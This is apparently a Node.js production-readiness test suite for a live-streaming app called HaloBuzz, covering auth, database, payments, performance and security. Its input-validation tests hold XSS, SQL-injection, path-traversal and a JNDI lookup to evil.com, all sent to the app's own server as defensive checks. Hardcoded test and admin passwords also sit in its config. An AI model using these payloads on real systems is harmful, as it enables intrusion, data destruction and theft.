const axios = require('axios');
const mongoose = require('mongoose');
const fs = require('fs');
const path = require('path');
require('dotenv').config();

// Test configuration
const config = {
  baseUrl: process.env.API_BASE_URL || 'http://localhost:4000',
  apiVersion: process.env.API_VERSION || 'v1',
  testUser: {
    email: 'test@halobuzz.com',
    username: 'testuser',
    password: 'TestPassword123!'
  },
  adminUser: {
    email: 'admin@halobuzz.com',
    username: 'admin',
    password: 'AdminPassword123!'
  }
};

// Test results tracking
const testResults = {
  passed: 0,
  failed: 0,
  skipped: 0,
  errors: [],
  startTime: Date.now(),
  categories: {
    authentication: { passed: 0, failed: 0, tests: [] },
    database: { passed: 0, failed: 0, tests: [] },
    api: { passed: 0, failed: 0, tests: [] },
    security: { passed: 0, failed: 0, tests: [] },
    performance: { passed: 0, failed: 0, tests: [] },
    integration: { passed: 0, failed: 0, tests: [] }
  }
};

class ProductionReadinessTester {
  constructor() {
    this.authToken = null;
    this.adminToken = null;
    this.testUserId = null;
    this.testStreamId = null;
  }

  /**
   * Run all production readiness tests
   */
  async runAllTests() {
    console.log('🚀 Starting HaloBuzz Production Readiness Tests\n');
    console.log(`Testing against: ${config.baseUrl}/api/${config.apiVersion}\n`);

    try {
      // Database connection test
      await this.testDatabaseConnection();
      
      // Authentication tests
      await this.testAuthentication();
      await this.testUserRegistration();
      await this.testUserLogin();
      await this.testTokenValidation();
      
      // Database tests
      await this.testDatabaseIndexes();
      await this.testDatabasePerformance();
      await this.testDataIntegrity();
      
      // API tests
      await this.testAPIEndpoints();
      await this.testPaymentGateways();
      await this.testLiveStreaming();
      await this.testGiftSystem();
      
      // Security tests
      await this.testSecurityHeaders();
      await this.testRateLimiting();
      await this.testInputValidation();
      await this.testSQLInjection();
      await this.testXSSProtection();
      
      // Performance tests
      await this.testResponseTimes();
      await this.testConcurrentUsers();
      await this.testMemoryUsage();
      await this.testDatabaseQueries();
      
      // Integration tests
      await this.testEndToEndFlow();
      await this.testMobileAPI();
      await this.testAdminDashboard();
      
      // Generate report
      await this.generateReport();
      
    } catch (error) {
      console.error('💥 Test suite failed:', error);
      process.exit(1);
    }
  }

  /**
   * Test database connection
   */
  async testDatabaseConnection() {
    await this.runTest('Database Connection', 'database', async () => {
      const mongoUri = process.env.MONGODB_URI || 'mongodb://localhost:27017/halobuzz';
      await mongoose.connect(mongoUri, {
        useNewUrlParser: true,
        useUnifiedTopology: true,
      });
      
      if (mongoose.connection.readyState !== 1) {
        throw new Error('Database connection failed');
      }
      
      console.log('  ✅ Database connected successfully');
    });
  }

  /**
   * Test authentication system
   */
  async testAuthentication() {
    await this.runTest('Authentication System', 'authentication', async () => {
      const response = await axios.post(`${config.baseUrl}/api/${config.apiVersion}/auth/login`, {
        email: config.testUser.email,
        password: config.testUser.password
      });

      if (!response.data.success || !response.data.token) {
        throw new Error('Authentication failed');
      }

      this.authToken = response.data.token;
      console.log('  ✅ Authentication successful');
    });
  }

  /**
   * Test user registration
   */
  async testUserRegistration() {
    await this.runTest('User Registration', 'authentication', async () => {
      const testEmail = `test_${Date.now()}@halobuzz.com`;
      const response = await axios.post(`${config.baseUrl}/api/${config.apiVersion}/auth/register`, {
        email: testEmail,
        username: `testuser_${Date.now()}`,
        password: 'TestPassword123!',
        confirmPassword: 'TestPassword123!'
      });

      if (!response.data.success) {
        throw new Error('User registration failed');
      }

      console.log('  ✅ User registration successful');
    });
  }

  /**
   * Test user login
   */
  async testUserLogin() {
    await this.runTest('User Login', 'authentication', async () => {
      const response = await axios.post(`${config.baseUrl}/api/${config.apiVersion}/auth/login`, {
        email: config.testUser.email,
        password: config.testUser.password
      });

      if (!response.data.success || !response.data.user) {
        throw new Error('User login failed');
      }

      this.testUserId = response.data.user.id;
      console.log('  ✅ User login successful');
    });
  }

  /**
   * Test token validation
   */
  async testTokenValidation() {
    await this.runTest('Token Validation', 'authentication', async () => {
      if (!this.authToken) {
        throw new Error('No auth token available');
      }

      const response = await axios.get(`${config.baseUrl}/api/${config.apiVersion}/auth/me`, {
        headers: { Authorization: `Bearer ${this.authToken}` }
      });

      if (!response.data.success || !response.data.user) {
        throw new Error('Token validation failed');
      }

      console.log('  ✅ Token validation successful');
    });
  }

  /**
   * Test database indexes
   */
  async testDatabaseIndexes() {
    await this.runTest('Database Indexes', 'database', async () => {
      const collections = ['users', 'livestreams', 'transactions', 'gifts'];
      
      for (const collectionName of collections) {
        const collection = mongoose.connection.db.collection(collectionName);
        const indexes = await collection.indexes();
        
        if (indexes.length < 3) {
          throw new Error(`Insufficient indexes for ${collectionName}: ${indexes.length}`);
        }
      }

      console.log('  ✅ Database indexes verified');
    });
  }

  /**
   * Test database performance
   */
  async testDatabasePerformance() {
    await this.runTest('Database Performance', 'database', async () => {
      const start = Date.now();
      
      // Test user query
      const User = mongoose.model('User');
      await User.findOne().limit(1);
      
      const queryTime = Date.now() - start;
      if (queryTime > 1000) {
        throw new Error(`Database query too slow: ${queryTime}ms`);
      }

      console.log(`  ✅ Database performance good: ${queryTime}ms`);
    });
  }

  /**
   * Test data integrity
   */
  async testDataIntegrity() {
    await this.runTest('Data Integrity', 'database', async () => {
      const User = mongoose.model('User');
      const Transaction = mongoose.model('Transaction');
      
      // Test user data integrity
      const users = await User.find({}).limit(10);
      for (const user of users) {
        if (!user.email || !user.username) {
          throw new Error('User data integrity issue');
        }
      }

      // Test transaction data integrity
      const transactions = await Transaction.find({}).limit(10);
      for (const transaction of transactions) {
        if (!transaction.userId || !transaction.amount) {
          throw new Error('Transaction data integrity issue');
        }
      }

      console.log('  ✅ Data integrity verified');
    });
  }

  /**
   * Test API endpoints
   */
  async testAPIEndpoints() {
    await this.runTest('API Endpoints', 'api', async () => {
      const endpoints = [
        '/auth/me',
        '/streams',
        '/gifts',
        '/wallet/balance',
        '/og/status'
      ];

      for (const endpoint of endpoints) {
        try {
          const response = await axios.get(`${config.baseUrl}/api/${config.apiVersion}${endpoint}`, {
            headers: { Authorization: `Bearer ${this.authToken}` }
          });
          
          if (response.status !== 200 && response.status !== 401) {
            throw new Error(`Endpoint ${endpoint} returned status ${response.status}`);
          }
        } catch (error) {
          if (error.response?.status === 401) {
            // Expected for some endpoints
            continue;
          }
          throw error;
        }
      }

      console.log('  ✅ API endpoints accessible');
    });
  }

  /**
   * Test payment gateways
   */
  async testPaymentGateways() {
    await this.runTest('Payment Gateways', 'api', async () => {
      const paymentMethods = ['stripe', 'paypal', 'esewa', 'khalti'];
      
      for (const method of paymentMethods) {
        try {
          const response = await axios.post(`${config.baseUrl}/api/${config.apiVersion}/wallet/recharge`, {
            amount: 100,
            coins: 500,
            paymentMethod: method,
            currency: method === 'stripe' ? 'USD' : 'NPR'
          }, {
            headers: { Authorization: `Bearer ${this.authToken}` }
          });

          if (!response.data.success && !response.data.error?.includes('configuration')) {
            throw new Error(`Payment method ${method} failed`);
          }
        } catch (error) {
          if (error.response?.data?.error?.includes('configuration')) {
            console.log(`    ⚠️  ${method} not configured (expected)`);
            continue;
          }
          throw error;
        }
      }

      console.log('  ✅ Payment gateways tested');
    });
  }

  /**
   * Test live streaming
   */
  async testLiveStreaming() {
    await this.runTest('Live Streaming', 'api', async () => {
      // Test stream creation
      const response = await axios.post(`${config.baseUrl}/api/${config.apiVersion}/streams`, {
        title: 'Test Stream',
        description: 'Test stream for production readiness',
        category: 'gaming',
        quality: '720p'
      }, {
        headers: { Authorization: `Bearer ${this.authToken}` }
      });

      if (!response.data.success) {
        throw new Error('Stream creation failed');
      }

      this.testStreamId = response.data.stream.id;
      console.log('  ✅ Live streaming functional');
    });
  }

  /**
   * Test gift system
   */
  async testGiftSystem() {
    await this.runTest('Gift System', 'api', async () => {
      // Test gift sending
      const response = await axios.post(`${config.baseUrl}/api/${config.apiVersion}/gifts/send`, {
        streamId: this.testStreamId,
        giftId: 'test-gift',
        quantity: 1
      }, {
        headers: { Authorization: `Bearer ${this.authToken}` }
      });

      if (!response.data.success && !response.data.error?.includes('insufficient')) {
        throw new Error('Gift system failed');
      }

      console.log('  ✅ Gift system functional');
    });
  }

  /**
   * Test security headers
   */
  async testSecurityHeaders() {
    await this.runTest('Security Headers', 'security', async () => {
      const response = await axios.get(`${config.baseUrl}/api/${config.apiVersion}/auth/me`, {
        headers: { Authorization: `Bearer ${this.authToken}` }
      });

      const securityHeaders = [
        'x-frame-options',
        'x-content-type-options',
        'x-xss-protection',
        'strict-transport-security'
      ];

      for (const header of securityHeaders) {
        if (!response.headers[header]) {
          throw new Error(`Missing security header: ${header}`);
        }
      }

      console.log('  ✅ Security headers present');
    });
  }

  /**
   * Test rate limiting
   */
  async testRateLimiting() {
    await this.runTest('Rate Limiting', 'security', async () => {
      const requests = [];
      
      // Make multiple rapid requests
      for (let i = 0; i < 10; i++) {
        requests.push(
          axios.get(`${config.baseUrl}/api/${config.apiVersion}/auth/me`, {
            headers: { Authorization: `Bearer ${this.authToken}` }
          }).catch(error => error.response)
        );
      }

      const responses = await Promise.all(requests);
      const rateLimited = responses.some(r => r.status === 429);

      if (!rateLimited) {
        console.log('    ⚠️  Rate limiting not triggered (may be configured differently)');
      } else {
        console.log('  ✅ Rate limiting active');
      }
    });
  }

  /**
   * Test input validation
   */
  async testInputValidation() {
    await this.runTest('Input Validation', 'security', async () => {
      // Test malicious input
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        "'; DROP TABLE users; --",
        '../../../etc/passwd',
        '${jndi:ldap://evil.com}'
      ];

      for (const input of maliciousInputs) {
        try {
          await axios.post(`${config.baseUrl}/api/${config.apiVersion}/auth/register`, {
            email: input,
            username: input,
            password: 'Test123!',
            confirmPassword: 'Test123!'
          });
        } catch (error) {
          if (error.response?.status === 400) {
            continue; // Expected validation error
          }
          throw new Error(`Input validation failed for: ${input}`);
        }
      }

      console.log('  ✅ Input validation working');
    });
  }

  /**
   * Test SQL injection protection
   */
  async testSQLInjection() {
    await this.runTest('SQL Injection Protection', 'security', async () => {
      const sqlPayloads = [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT * FROM users --"
      ];

      for (const payload of sqlPayloads) {
        try {
          await axios.post(`${config.baseUrl}/api/${config.apiVersion}/auth/login`, {
            email: payload,
            password: payload
          });
        } catch (error) {
          if (error.response?.status === 400 || error.response?.status === 401) {
            continue; // Expected error
          }
          throw new Error(`SQL injection protection failed for: ${payload}`);
        }
      }

      console.log('  ✅ SQL injection protection active');
    });
  }

  /**
   * Test XSS protection
   */
  async testXSSProtection() {
    await this.runTest('XSS Protection', 'security', async () => {
      const xssPayload = '<script>alert("xss")</script>';
      
      try {
        const response = await axios.post(`${config.baseUrl}/api/${config.apiVersion}/streams`, {
          title: xssPayload,
          description: xssPayload,
          category: 'gaming'
        }, {
          headers: { Authorization: `Bearer ${this.authToken}` }
        });

        // Check if script tags are sanitized
        if (response.data.stream.title.includes('<script>')) {
          throw new Error('XSS protection failed - script tags not sanitized');
        }
      } catch (error) {
        if (error.response?.status === 400) {
          console.log('  ✅ XSS protection active (input rejected)');
          return;
        }
        throw error;
      }

      console.log('  ✅ XSS protection working');
    });
  }

  /**
   * Test response times
   */
  async testResponseTimes() {
    await this.runTest('Response Times', 'performance', async () => {
      const endpoints = [
        '/auth/me',
        '/streams',
        '/gifts',
        '/wallet/balance'
      ];

      const maxResponseTime = 2000; // 2 seconds

      for (const endpoint of endpoints) {
        const start = Date.now();
        
        try {
          await axios.get(`${config.baseUrl}/api/${config.apiVersion}${endpoint}`, {
            headers: { Authorization: `Bearer ${this.authToken}` }
          });
        } catch (error) {
          // Ignore auth errors for this test
        }

        const responseTime = Date.now() - start;
        if (responseTime > maxResponseTime) {
          throw new Error(`Endpoint ${endpoint} too slow: ${responseTime}ms`);
        }
      }

      console.log('  ✅ Response times acceptable');
    });
  }

  /**
   * Test concurrent users
   */
  async testConcurrentUsers() {
    await this.runTest('Concurrent Users', 'performance', async () => {
      const concurrentRequests = 50;
      const requests = [];

      for (let i = 0; i < concurrentRequests; i++) {
        requests.push(
          axios.get(`${config.baseUrl}/api/${config.apiVersion}/auth/me`, {
            headers: { Authorization: `Bearer ${this.authToken}` }
          }).catch(error => error.response)
        );
      }

      const start = Date.now();
      const responses = await Promise.all(requests);
      const totalTime = Date.now() - start;

      const successfulRequests = responses.filter(r => r.status === 200).length;
      const successRate = (successfulRequests / concurrentRequests) * 100;

      if (successRate < 80) {
        throw new Error(`Concurrent user test failed: ${successRate}% success rate`);
      }

      console.log(`  ✅ Concurrent users handled: ${successRate}% success rate in ${totalTime}ms`);
    });
  }

  /**
   * Test memory usage
   */
  async testMemoryUsage() {
    await this.runTest('Memory Usage', 'performance', async () => {
      const memUsage = process.memoryUsage();
      const maxMemoryMB = 500; // 500MB limit

      if (memUsage.heapUsed / 1024 / 1024 > maxMemoryMB) {
        throw new Error(`Memory usage too high: ${memUsage.heapUsed / 1024 / 1024}MB`);
      }

      console.log(`  ✅ Memory usage acceptable: ${(memUsage.heapUsed / 1024 / 1024).toFixed(2)}MB`);
    });
  }

  /**
   * Test database queries
   */
  async testDatabaseQueries() {
    await this.runTest('Database Queries', 'performance', async () => {
      const User = mongoose.model('User');
      const Transaction = mongoose.model('Transaction');
      const LiveStream = mongoose.model('LiveStream');

      const queries = [
        () => User.find({}).limit(100),
        () => Transaction.find({}).limit(100),
        () => LiveStream.find({}).limit(100),
        () => User.aggregate([{ $group: { _id: '$ogLevel', count: { $sum: 1 } } }])
      ];

      for (const query of queries) {
        const start = Date.now();
        await query();
        const queryTime = Date.now() - start;

        if (queryTime > 1000) {
          throw new Error(`Database query too slow: ${queryTime}ms`);
        }
      }

      console.log('  ✅ Database queries performant');
    });
  }

  /**
   * Test end-to-end flow
   */
  async testEndToEndFlow() {
    await this.runTest('End-to-End Flow', 'integration', async () => {
      // 1. User login
      const loginResponse = await axios.post(`${config.baseUrl}/api/${config.apiVersion}/auth/login`, {
        email: config.testUser.email,
        password: config.testUser.password
      });

      if (!loginResponse.data.success) {
        throw new Error('E2E: Login failed');
      }

      const token = loginResponse.data.token;

      // 2. Create stream
      const streamResponse = await axios.post(`${config.baseUrl}/api/${config.apiVersion}/streams`, {
        title: 'E2E Test Stream',
        description: 'End-to-end test stream',
        category: 'gaming'
      }, {
        headers: { Authorization: `Bearer ${token}` }
      });

      if (!streamResponse.data.success) {
        throw new Error('E2E: Stream creation failed');
      }

      // 3. Check wallet balance
      const walletResponse = await axios.get(`${config.baseUrl}/api/${config.apiVersion}/wallet/balance`, {
        headers: { Authorization: `Bearer ${token}` }
      });

      if (!walletResponse.data.success) {
        throw new Error('E2E: Wallet check failed');
      }

      console.log('  ✅ End-to-end flow working');
    });
  }

  /**
   * Test mobile API
   */
  async testMobileAPI() {
    await this.runTest('Mobile API', 'integration', async () => {
      const mobileEndpoints = [
        '/auth/login',
        '/streams',
        '/gifts',
        '/wallet/balance',
        '/og/status'
      ];

      for (const endpoint of mobileEndpoints) {
        try {
          const response = await axios.get(`${config.baseUrl}/api/${config.apiVersion}${endpoint}`, {
            headers: { 
              Authorization: `Bearer ${this.authToken}`,
              'User-Agent': 'HaloBuzz-Mobile/1.0.0'
            }
          });

          if (response.status !== 200 && response.status !== 401) {
            throw new Error(`Mobile API endpoint ${endpoint} failed`);
          }
        } catch (error) {
          if (error.response?.status === 401) {
            continue; // Expected for some endpoints
          }
          throw error;
        }
      }

      console.log('  ✅ Mobile API functional');
    });
  }

  /**
   * Test admin dashboard
   */
  async testAdminDashboard() {
    await this.runTest('Admin Dashboard', 'integration', async () => {
      // Test admin endpoints (these might require admin token)
      const adminEndpoints = [
        '/admin/users',
        '/admin/streams',
        '/admin/transactions',
        '/admin/moderation/flags'
      ];

      for (const endpoint of adminEndpoints) {
        try {
          const response = await axios.get(`${config.baseUrl}/api/${config.apiVersion}${endpoint}`, {
            headers: { Authorization: `Bearer ${this.authToken}` }
          });

          // Admin endpoints might return 403 for non-admin users
          if (response.status !== 200 && response.status !== 403) {
            throw new Error(`Admin endpoint ${endpoint} failed with status ${response.status}`);
          }
        } catch (error) {
          if (error.response?.status === 403) {
            continue; // Expected for non-admin users
          }
          throw error;
        }
      }

      console.log('  ✅ Admin dashboard accessible');
    });
  }

  /**
   * Run a single test
   */
  async runTest(testName, category, testFunction) {
    try {
      console.log(`🧪 Testing: ${testName}`);
      await testFunction();
      
      testResults.passed++;
      testResults.categories[category].passed++;
      testResults.categories[category].tests.push({ name: testName, status: 'passed' });
      
      console.log(`✅ ${testName}: PASSED\n`);
    } catch (error) {
      testResults.failed++;
      testResults.categories[category].failed++;
      testResults.categories[category].tests.push({ name: testName, status: 'failed', error: error.message });
      testResults.errors.push(`${testName}: ${error.message}`);
      
      console.log(`❌ ${testName}: FAILED - ${error.message}\n`);
    }
  }

  /**
   * Generate comprehensive test report
   */
  async generateReport() {
    const totalTests = testResults.passed + testResults.failed;
    const successRate = ((testResults.passed / totalTests) * 100).toFixed(1);
    const duration = Date.now() - testResults.startTime;

    console.log('📊 PRODUCTION READINESS TEST REPORT');
    console.log('=====================================\n');

    console.log(`📈 Overall Results:`);
    console.log(`  ✅ Passed: ${testResults.passed}`);
    console.log(`  ❌ Failed: ${testResults.failed}`);
    console.log(`  📊 Success Rate: ${successRate}%`);
    console.log(`  ⏱️  Duration: ${(duration / 1000).toFixed(2)}s\n`);

    console.log(`📋 Category Breakdown:`);
    for (const [category, results] of Object.entries(testResults.categories)) {
      const categoryTotal = results.passed + results.failed;
      const categoryRate = categoryTotal > 0 ? ((results.passed / categoryTotal) * 100).toFixed(1) : '0';
      
      console.log(`  ${category.toUpperCase()}: ${results.passed}/${categoryTotal} (${categoryRate}%)`);
      
      if (results.failed > 0) {
        console.log(`    Failed tests:`);
        results.tests.filter(t => t.status === 'failed').forEach(test => {
          console.log(`      - ${test.name}: ${test.error}`);
        });
      }
    }

    if (testResults.errors.length > 0) {
      console.log(`\n❌ Failed Tests:`);
      testResults.errors.forEach(error => {
        console.log(`  - ${error}`);
      });
    }

    // Generate verdict
    let verdict = '❌ NOT READY';
    if (successRate >= 95) {
      verdict = '✅ PRODUCTION READY';
    } else if (successRate >= 80) {
      verdict = '⚠️  MOSTLY READY (Minor Issues)';
    } else if (successRate >= 60) {
      verdict = '⚠️  NEEDS WORK (Major Issues)';
    }

    console.log(`\n🎯 VERDICT: ${verdict}`);

    // Save report to file
    const report = {
      timestamp: new Date().toISOString(),
      config,
      summary: {
        passed: testResults.passed,
        failed: testResults.failed,
        successRate: parseFloat(successRate),
        duration: duration / 1000,
        verdict
      },
      categories: testResults.categories,
      errors: testResults.errors
    };

    const reportPath = path.join(__dirname, 'production-readiness-report.json');
    fs.writeFileSync(reportPath, JSON.stringify(report, null, 2));
    
    console.log(`\n📄 Detailed report saved to: ${reportPath}`);

    // Exit with appropriate code
    if (successRate < 80) {
      process.exit(1);
    }
  }
}

// Main execution
async function main() {
  const tester = new ProductionReadinessTester();
  await tester.runAllTests();
}

// Run if called directly
if (require.main === module) {
  main().catch(error => {
    console.error('💥 Test suite crashed:', error);
    process.exit(1);
  });
}

module.exports = ProductionReadinessTester;

